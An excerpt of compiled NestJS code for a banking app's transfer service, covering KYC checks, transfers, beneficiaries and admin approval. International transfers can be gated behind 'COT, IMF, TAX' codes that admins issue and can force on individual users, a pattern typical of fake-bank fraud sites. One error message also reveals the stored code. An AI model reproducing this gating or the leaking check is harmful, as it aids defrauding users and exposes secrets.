...
Object.defineProperty(exports, "TransfersService", {
    enumerable: true,
    get: function() {
...
let TransfersService = class TransfersService {
   ...
   */ async initiateLocalTransfer(userId, data) {
        ...
        if (!sender) throw new _common.NotFoundException('Sender not found');
        // Check KYC verification
        if (!sender.kyc || sender.kyc.status !== 'APPROVED') {
            throw new _common.BadRequestException('KYC verification is required to make transfers. Please complete your KYC verification first.');
        }
        ...
        if (!receiver) throw new _common.BadRequestException('Recipient not found');
        if (sender.id === receiver.id) {
            throw new _common.BadRequestException('Cannot transfer to yourself');
        }
        const amount = new _library.Decimal(data.amount);
        if (!sender.wallet) {
            throw new _common.BadRequestException('Sender wallet not found');
        }
        if (new _library.Decimal(sender.wallet.balance).lessThan(amount)) {
            throw new _common.BadRequestException(`Insufficient balance. Available: ${sender.wallet.balance.toString()} ${sender.wallet.currency}, Required: ${amount.toString()} ${sender.wallet.currency}`);
        }
   ...
   */ async requestLocalTransfer(userId, data) {
        const sender = await this.prisma.user.findUnique({
            where: {
                id: userId
            },
        ...
        // Check KYC verification
        if (!sender.kyc || sender.kyc.status !== 'APPROVED') {
            throw new _common.BadRequestException('KYC verification is required to request transfers. Please complete your KYC verification first.');
        }
        ...
        if (!receiver) {
            throw new _common.BadRequestException(`Recipient not found. Searched for: ${data.recipientEmail || data.recipientAccount || 'no identifier provided'}`);
        }
        if (!sender.wallet) {
            throw new _common.BadRequestException('Sender wallet not found');
        }
   ...
   */ async initiateInternationalTransfer(userId, data) {
        ...
        const forcedSetting = await this.prisma.systemSetting.findUnique({
            where: {
                key: `transferCodes.force.${userId}`
            }
        });
        const truthy = (v)=>typeof v === 'string' ? [
                'true',
                '1',
                'yes',
                'on',
        ...
        const codesRequired = (Array.isArray(settings) ? settings.some((s)=>/codes?/i.test(s.key) && truthy(s.value)) : false) || !!(forcedSetting && truthy(forcedSetting.value));
        ...
        if (data.transferCodes && data.transferCodes.length > 0) {
            ...
            if (!validCodes) {
                throw new _common.BadRequestException('Invalid or inactive transfer codes');
            }
            ...
            if (!hasAll) {
                throw new _common.BadRequestException('Transfer codes required (COT, IMF, TAX)');
            }
        }
        ...
        if (!user.kyc || user.kyc.status !== 'APPROVED') {
            throw new _common.BadRequestException('KYC verification is required to make international transfers. Please complete your KYC verification first.');
        }
        const amount = new _library.Decimal(data.amount);
        // Check if user has sufficient balance
        if (new _library.Decimal(user.wallet.balance).lessThan(amount)) {
            throw new _common.BadRequestException(`Insufficient balance. Available: ${user.wallet.balance.toString()} ${user.wallet.currency}, Required: ${amount.toString()} ${data.currency || user.wallet.currency}`);
        }
   ...
   */ async validateTransferCodes(userId, codes) {
   ...
   */ async createBeneficiary(userId, data) {
        ...
        if (existing) {
            throw new _common.BadRequestException('Beneficiary already exists');
        }
   ...
   */ async updateBeneficiary(userId, beneficiaryId, data) {
        ...
        if (!beneficiary || beneficiary.userId !== userId) {
            throw new _common.BadRequestException('Beneficiary not found or unauthorized');
        }
   ...
   */ async setDefaultBeneficiary(userId, beneficiaryId) {
        const beneficiary = await this.prisma.beneficiary.findUnique({
            where: {
                id: beneficiaryId
            }
   ...
   */ async getTransferHistory(userId, limit = 10, skip = 0) {
   ...
   */ async approveTransfer(transferId, adminId) {
        ...
        if (!transfer) {
            throw new _common.NotFoundException('Transfer not found');
        }
        if (transfer.status !== 'PENDING') {
            throw new _common.BadRequestException('Transfer already processed');
        }
   ...
   */ async rejectTransfer(transferId, adminId, reason) {
        const transfer = await this.prisma.transfer.findUnique({
            where: {
                id: transferId
            },
   ...
   */ async deleteTransfer(userId, transferId) {
        ...
        if (transfer.senderId !== userId && transfer.receiverId !== userId) {
            throw new _common.BadRequestException('You can only delete your own transfers');
        }
        // Only allow deletion of failed or completed transfers
        if (transfer.status === 'PENDING' || transfer.status === 'PROCESSING') {
            throw new _common.BadRequestException('Cannot delete pending or processing transfers');
        }
   ...
   */ async adminDeleteTransfer(transferId, adminId) {
        const transfer = await this.prisma.transfer.findUnique({
            where: {
                id: transferId
            },
   ...
   */ async requestTransferCode(userId, type) {
   ...
   */ async verifyUserTransferCode(userId, type, code) {
        ...
        if (!rec) {
            throw new _common.BadRequestException(`No ${type} code found. Please request one first.`);
        }
        if (!rec.isActive) {
            throw new _common.BadRequestException(`${type} code not activated yet. Please wait for admin approval.`);
        }
        ...
        const normalizeCode = (c)=>c.replace(/O/g, '0').replace(/[Il]/g, '1');
        ...
        if (normalizedStored !== normalizedProvided) {
            throw new _common.BadRequestException(`Invalid ${type} code. Expected: "${storedCode}" (length: ${storedCode.length}), Got: "${providedCode}" (length: ${providedCode.length}). Please check carefully - use number 0 not letter O.`);
        }
   ...
   */ async adminApproveAndIssueTransferCode(targetUserId, type, adminId) {
        // Generate code
        ...
        try {
            await this.email?.sendTransferCodeEmail?.({
                email: user?.email,
   ...
   */ async getUserTransferCodeStatus(userId) {
        ...
        const codesRequired = Array.isArray(settings) ? settings.some((s)=>/codes?/i.test(s.key) && truthy(s.value)) : false;
        ...
        return {
            transferCodesRequired: codesRequired,
            codes: byType
        };
    }
    /**
   ...
   */ async adminGetUserCodes(userId) {
        ...
        const force = await this.prisma.systemSetting.findUnique({
            where: {
                key: `transferCodes.force.${userId}`
            }
        });
        return {
            forced: !!(force && (force.value === 'true' || force.value === '1')),
            codes
        };
    }
    /**
   * Admin: Set or clear per-user force-verification override
   */ async adminSetUserCodesForce(userId, forced) {
        await this.prisma.systemSetting.upsert({
            where: {
                key: `transferCodes.force.${userId}`
            },
            update: {
                value: forced ? 'true' : 'false'
            },
            create: {
                key: `transferCodes.force.${userId}`,
                value: forced ? 'true' : 'false',
                description: 'Per-user transfer codes force flag'
            }
        });
        return {
            forced
